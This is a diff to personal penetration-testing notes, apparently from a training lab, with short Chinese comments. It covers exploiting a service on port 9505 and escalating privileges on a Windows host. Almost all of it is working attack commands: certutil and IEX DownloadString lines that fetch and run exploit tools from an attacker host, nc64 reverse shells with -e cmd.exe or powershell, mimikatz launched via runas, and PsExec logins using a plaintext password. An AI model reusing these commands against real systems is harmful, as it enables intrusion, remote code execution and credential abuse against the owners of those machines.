@@ -7,6 +7,12 @@ gobuster dir  -u http://10.11.1.50/ -w /usr/share/dirbuster/wordlists/directory-
 
 1.nmap掃描出80及9505,drupalgedden不可用,嘗試9505漏洞使用https://www.exploit-db.com/exploits/39161
 2.修改腳本內容,要起本地80提供nc.exe,及起一個443reverse listen
+python exploit.py 10.11.1.50 9505
+3.取得revershell後將startprocess.ps1傳到victim上面
+4.powershell使用其他用戶執行指令密碼需要強制使用明文
+4.執行startprocess.ps1取得alice權限
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File startprocess.ps1
+
 
 certutil.exe -urlcache -split -f http://192.168.119.134/MSFRottenPotato.exe MSFRottenPotato.exe
 certutil.exe -urlcache -split -f http://192.168.119.134/shell.bat shell.bat
@@ -20,13 +26,22 @@ certutil.exe -urlcache -split -f http://192.168.119.134/ms16-032.exe ms16-032.ex
 certutil.exe -urlcache -split -f http://192.168.119.134/ms16-0321.exe ms16-0321.exe
 certutil.exe -urlcache -split -f http://192.168.119.134/Invoke-MS16-032.ps1 Invoke.ps1
 certutil.exe -urlcache -split -f http://192.168.119.134/39719.ps1 39719.ps1
+certutil.exe -urlcache -split -f http://192.168.119.134/winPEAS.exe winPEAS.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/PsExec.exe PsExec.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/PsExec64.exe PsExec64.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/nc64.exe nc64.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/whoami.exe whoami.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/shell.bat shell.bat
+certutil.exe -urlcache -split -f http://192.168.119.134/startprocess.ps1 startprocess.ps1
 
 $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
 
 for /f eol^=^"^ delims^=^" %a in (C:\Users\Bethany\AppData\permissions.txt) do cmd.exe /c icacls "%a"
 
 runas.exe /savecred /user:administrator  mimikatz.exe "%sysdrive%\testScripts\testscript1.ps1"
+runas.exe /user:alice cmd
 
+c:\Windows\SysNative\Windowspowershell\v1.0\powers ****.exe
 
 IEX(New-Object Net.Webclient).downloadstring('http://192.168.119.134/Sherlock.ps1')
 IEX(New-Object Net.Webclient).downloadstring('http://192.168.119.134/PowerUp.ps1')
@@ -50,7 +65,50 @@ powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134
 powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/Invoke-PowerShellTcp.ps1')
 powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/ms16_032_intrd_mod.ps1')
 powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/39719.ps1')
+powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/Invoke-MS16032.ps1')
 
 
 powershell -ExecutionPolicy bypass -File ./39719.ps1
 powershell -ExecutionPolicy bypass -File ./ms16-032.exe
+
+
+runas /user:alice C:\Windows\System32\cmd.exe
+echo "aliceishere" | sudo -S -u alice "whoami"
+PsExec64.exe  /accepteula -u alice -p aliceishere  whoami.exe
+PsExec64.exe  /accepteula  -u alice -p aliceishere  -d  cmd "echo DFGDF > ggg"
+
+.\PsExec.exe  -u alice -p aliceishere cmd C:\Windows\System32\cmd.exe
+PsExec.exe /accepteula  \\192.168.3.56 -u Administrator -p s cmd /c "ipconfig"
+
+
+
+C:\Users\Bethany\Desktop\PsExec64.exe  -u alice -p aliceishere cmd C:\Windows\System32\cmd.exe
+C:\Users\Bethany\Desktop\PsExec64.exe  -u alice -p aliceishere C:\users\Bethany\desktop\whoami.exe
+
+
+C:\users\Bethany\desktop\PsExec64.exe  -accepteula  -s -u thinc.local\alice -p aliceishere \\WORKGROUP C:\users\Bethany\desktop\whoami.exe
+
+powershell -ExecutionPolicy Bypass  C:\users\Bethany\desktop\PsExec64.exe  -accepteula -i -u mydomain\myusername -p mypassword \\mycomputer cmd. exe /c "﻿\\appserver\local\apps\myprogram.exe"
+
+PsExec64.exe -accepteula \\10.11.1.50 -u alice -p aliceishere cmd
+powershell -ExecutionPolicy Bypass  C:\users\Bethany\desktop\PsExec64.exe -accepteula \\10.11.1.5 -u alice -p aliceishere cmd
+powershell -ExecutionPolicy Bypass  C:\users\Bethany\desktop\PsExec64.exe -accepteula  -u alice -p aliceishere whoami
+powershell -ExecutionPolicy Bypass  C:\users\Bethany\desktop\PsExec64.exe -accepteula  -u alice -p aliceishere "ipconfig"
+
+PsExec64.exe \\127.0.0.1 -u "thinc.loca\alice"  -p  -c nircmd.exe savescreenshot "c:\shot.png"
+PsExec.exe -accepteula -i -s \\%computername% "C:\Program Files\Cheat Engine 6.3\Cheat Engine.exe"
+
+
+echo aliceishere | runas /user:Bethany\alice C:\HFS\nc64.exe 192.168.119.134 6666 -e cmd.exe
+runas /user:Bethany\alice C:\windows\sysnative\windowspowershell\v1.0\powershell.exe
+
+powershell runas /user:Bethany\alice nc64.exe 192.168.119.134 6666 -e C:\windows\sysnative\windowspowershell\v1.0\powershell.exe
+
+
+start-process "C:\pathtotool\dnscrypt-proxy.exe" -credential (.\PowerShellRunAs -get passwordfilename)
+start-process "C:\pathtotool\dnscrypt-proxy.exe" -credential
+
+C:\windows\sysnative\windowspowershell\v1.0\powershell.exe
+
+
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File startprocess.ps1 then run that.
